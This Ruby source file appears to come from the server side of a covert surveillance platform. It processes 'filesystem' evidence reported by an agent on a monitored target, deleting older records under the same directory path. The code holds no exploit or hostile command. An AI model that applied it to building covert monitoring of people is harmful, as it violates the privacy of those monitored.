require_relative 'single_evidence'

require 'rcs-common/evidence/filesystem'

module RCS
module FilesystemProcessing
  extend SingleEvidence

  def type
    :filesystem
  end

  def default_keyword_index

  end

  def process

    if self[:data][:attr] == FilesystemEvidence::FILESYSTEM_IS_FILE
      baseline = get_base_path(self[:data][:path])

      return if baseline.nil?

      agent = get_agent
      target = agent.get_parent

      # remove the sub-tree of this element
      # we match all the entries that have the baseline path in common and
      # the received date less than the current one (to avoid deleting other evidence received in this session)
      ::Evidence.target(target[:_id])
        .where(:type => 'filesystem',
               :aid => agent._id,
               :dr.lt => self[:dr].to_i,
               'data.path' => Regexp.new(Regexp.escape(baseline), Regexp::IGNORECASE)).each do |e|
        e.delete
      end

    end

  end

  def get_base_path(path)
    # get the last directory separator and return the first part
    last = path.rindex(/[\\\/]/)
    path.slice(0..last)
  rescue
    nil
  end

end # FilesystemProcessing
end # DB
